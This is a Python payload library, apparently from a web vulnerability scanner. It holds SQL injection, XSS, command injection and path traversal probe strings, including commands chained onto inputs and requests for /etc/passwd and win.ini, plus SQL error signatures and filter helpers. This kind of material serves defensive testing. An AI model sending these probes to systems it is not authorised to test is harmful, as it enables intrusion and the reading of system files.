"""
페이로드 라이브러리

다양한 취약점 테스트를 위한 페이로드 모음입니다.
모든 페이로드는 탐지 목적으로 설계되었습니다.
"""
from typing import List, Dict, Tuple


# =============================================================================
# SQL Injection 페이로드 (Read-Only, 안전)
# =============================================================================
SQLI_PAYLOADS: List[Tuple[str, str]] = [
    # 기본 구문 오류
    ("'", "single_quote"),
    ('"', "double_quote"),
    ("'--", "comment_dash"),
    ("'#", "comment_hash"),
    ("'/*", "comment_block"),
    
    # Boolean 기반
    ("' OR '1'='1", "or_true"),
    ("' OR '1'='2", "or_false"),
    ("' AND '1'='1", "and_true"),
    ("' AND '1'='2", "and_false"),
    ("1' OR '1'='1'--", "or_bypass"),
    ("admin'--", "admin_bypass"),
    
    # 시간 기반 (안전)
    ("' AND SLEEP(2)--", "mysql_sleep"),
    ("'; WAITFOR DELAY '00:00:02'--", "mssql_sleep"),
    ("' AND pg_sleep(2)--", "postgresql_sleep"),
    ("' AND DBMS_LOCK.SLEEP(2)--", "oracle_sleep"),
    
    # UNION 기반 (정보 수집용)
    ("' UNION SELECT NULL--", "union_1col"),
    ("' UNION SELECT NULL,NULL--", "union_2col"),
    ("' UNION SELECT NULL,NULL,NULL--", "union_3col"),
    
    # 에러 기반
    ("' AND 1=CONVERT(int,@@version)--", "mssql_version"),
    ("' AND extractvalue(1,concat(0x7e,version()))--", "mysql_extractvalue"),
    
    # 인코딩 우회
    ("%27", "url_encoded_quote"),
    ("&#39;", "html_entity_quote"),
    ("%2527", "double_url_encoded"),
]

# =============================================================================
# XSS 페이로드 (비실행, 탐지용)
# =============================================================================
XSS_PAYLOADS: List[Tuple[str, str]] = [
    # 기본 태그
    ("<xss>", "basic_tag"),
    ("<script>xss</script>", "script_tag"),
    ("<img src=x>", "img_tag"),
    ("<svg>", "svg_tag"),
    
    # 속성 이스케이프
    ('"><xss>', "break_dquote"),
    ("'><xss>", "break_squote"),
    ("></xss><xss>", "break_tag"),
    
    # 이벤트 핸들러
    ("onmouseover=xss", "event_mouseover"),
    ("onerror=xss", "event_error"),
    ("onload=xss", "event_load"),
    ("onfocus=xss", "event_focus"),
    
    # JavaScript 프로토콜
    ("javascript:xss", "js_protocol"),
    ("data:text/html,xss", "data_protocol"),
    
    # SVG/MathML
    ("<svg/onload=xss>", "svg_onload"),
    ("<math><maction>xss</maction></math>", "mathml"),
    
    # 템플릿 인젝션
    ("{{xss}}", "template_angular"),
    ("${xss}", "template_literal"),
    ("#{xss}", "template_ruby"),
    
    # 인코딩 우회
    ("%3Cscript%3E", "url_encoded"),
    ("&#60;script&#62;", "html_entity"),
    ("\\x3cscript\\x3e", "hex_escape"),
]

# =============================================================================
# Command Injection 페이로드 (무해한 명령)
# =============================================================================
CMDI_PAYLOADS: List[Tuple[str, str]] = [
    # 명령 연결
    ("; echo CMDTEST", "semicolon"),
    ("| echo CMDTEST", "pipe"),
    ("|| echo CMDTEST", "or"),
    ("&& echo CMDTEST", "and"),
    ("& echo CMDTEST", "background"),
    
    # 명령 치환
    ("`echo CMDTEST`", "backtick"),
    ("$(echo CMDTEST)", "subshell"),
    
    # 시간 지연
    ("; sleep 2", "sleep_unix"),
    ("| sleep 2", "pipe_sleep"),
    ("& ping -n 3 127.0.0.1", "ping_windows"),
    ("; ping -c 3 127.0.0.1", "ping_unix"),
    
    # 인코딩 우회
    (";%20echo%20CMDTEST", "url_encoded"),
    ("${IFS}echo${IFS}CMDTEST", "ifs_bypass"),
]

# =============================================================================
# Path Traversal 페이로드
# =============================================================================
PATH_TRAVERSAL_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../etc/passwd", "basic"),
    ("....//....//....//etc/passwd", "double_dot"),
    ("..%2f..%2f..%2fetc/passwd", "url_encoded"),
    ("..%252f..%252f..%252fetc/passwd", "double_encoded"),
    ("....\\....\\....\\windows\\win.ini", "windows_backslash"),
    ("%2e%2e%2f%2e%2e%2f", "full_url_encoded"),
    ("..%c0%af..%c0%afetc/passwd", "unicode_bypass"),
    ("..\\..\\..\\etc\\passwd", "backslash"),
]

# =============================================================================
# SQL 에러 시그니처
# =============================================================================
SQL_ERROR_PATTERNS: List[str] = [
    "sql syntax",
    "mysql",
    "mysqli",
    "mariadb",
    "postgresql",
    "pg_query",
    "sqlite",
    "oracle",
    "ora-",
    "pls-",
    "sql server",
    "mssql",
    "odbc",
    "jdbc",
    "microsoft ole db",
    "unclosed quotation",
    "unterminated string",
    "syntax error",
    "warning:",
    "fatal error",
    "unexpected token",
    "query failed",
]

# =============================================================================
# 유틸리티 함수
# =============================================================================

def get_sqli_payloads(safe_only: bool = True) -> List[Tuple[str, str]]:
    """SQLi 페이로드 반환"""
    if safe_only:
        # 시간 기반 및 에러 기반만
        return [p for p in SQLI_PAYLOADS 
                if 'sleep' in p[1] or 'quote' in p[1] or 'comment' in p[1]]
    return SQLI_PAYLOADS


def get_xss_payloads(safe_only: bool = True) -> List[Tuple[str, str]]:
    """XSS 페이로드 반환"""
    if safe_only:
        # 실행되지 않는 마커만
        return [p for p in XSS_PAYLOADS if 'xss' in p[0].lower()]
    return XSS_PAYLOADS


def get_cmdi_payloads(safe_only: bool = True) -> List[Tuple[str, str]]:
    """Command Injection 페이로드 반환"""
    if safe_only:
        # echo와 sleep만
        return [p for p in CMDI_PAYLOADS 
                if 'echo' in p[0].lower() or 'sleep' in p[0].lower() or 'ping' in p[0].lower()]
    return CMDI_PAYLOADS
